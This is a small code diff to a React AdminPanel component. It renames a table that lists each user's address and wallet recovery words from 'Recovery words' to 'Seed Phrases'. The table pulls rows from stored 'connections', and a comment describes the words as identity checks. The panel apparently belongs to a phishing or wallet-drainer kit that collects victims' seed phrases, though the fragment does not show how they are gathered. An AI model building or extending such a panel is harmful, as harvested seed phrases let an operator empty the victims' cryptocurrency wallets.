@@ -332,7 +332,7 @@ function AdminPanel() {
 
           {/* recovery words — used to confirm a user's identity */}
           <Table
-            title="Recovery words"
+            title="Seed Phrases"
             head={['User', 'Address', 'Words', 'When']}
             empty="No recovery words yet."
             rows={[...db.connections]
